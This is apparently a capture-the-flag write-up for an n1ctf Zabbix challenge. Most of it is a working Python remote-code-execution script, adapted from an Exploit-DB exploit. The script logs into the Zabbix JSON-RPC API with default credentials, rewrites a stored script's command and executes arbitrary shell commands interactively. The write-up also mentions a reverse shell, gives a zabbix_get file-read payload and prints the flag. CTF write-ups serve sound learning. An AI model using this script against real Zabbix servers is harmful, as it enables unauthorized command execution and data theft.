## fun_zabbix

After we compose docker, we can access 8080 port with running zabbix. During try somthing, sapra found https://www.exploit-db.com/exploits/39937 and it worked successfully. Now we got rce.

P.S I changed rce payload little

```python
import requests
import json
import readline

ZABIX_ROOT = 'http://vuln.live:8080'    ### Zabbix IP-address
url = ZABIX_ROOT + '/api_jsonrpc.php'    ### Don't edit

login = 'Admin'        ### Zabbix login
password = 'zabbix'    ### Zabbix password
hostid = '10084'    ### Zabbix hostid

### auth
payload = {
       "jsonrpc" : "2.0",
    "method" : "user.login",
    "params": {
        'user': ""+login+"",
        'password': ""+password+"",
    },
       "auth" : None,
    "id" : 0,
}
headers = {
    'content-type': 'application/json',
}

auth  = requests.post(url, data=json.dumps(payload), headers=(headers))
print auth
auth = auth.json()

while True:
    cmd = raw_input('\033[41m[zabbix_cmd]>>: \033[0m ')
    if cmd == "" : print "Result of last command:"
    if cmd == "quit" : break

### update
    payload = {
        "jsonrpc": "2.0",
        "method": "script.update",
        "params": {
            "scriptid": "1",
            "command": ""+cmd+""
        },
        "auth" : auth['result'],
        "id" : 0,
    }

    cmd_upd = requests.post(url, data=json.dumps(payload), headers=(headers))

### execute
    payload = {
        "jsonrpc": "2.0",
        "method": "script.execute",
        "params": {
            "scriptid": "1",
            "hostid": ""+hostid+""
        },
        "auth" : auth['result'],
        "id" : 0,
    }

    cmd_exe = requests.post(url, data=json.dumps(payload), headers=(headers))
    cmd_exe = cmd_exe.json()
    try:
        print cmd_exe["result"]["value"]
    except:
        print 'No such command.'
```

When I did `reverse shell`, I realized that we have `zabbix_get` in our dockers basically.

So, we started to find some method using zabbix_get and finally found `vfs.file.contents`.



So, our final payload was `zabbix_get -s zabbix-agent-secret -k vfs.file.contents[/flag/flag.txt]`

`n1ctf{cefa715f75e28670afe7d4bf654e00e4}`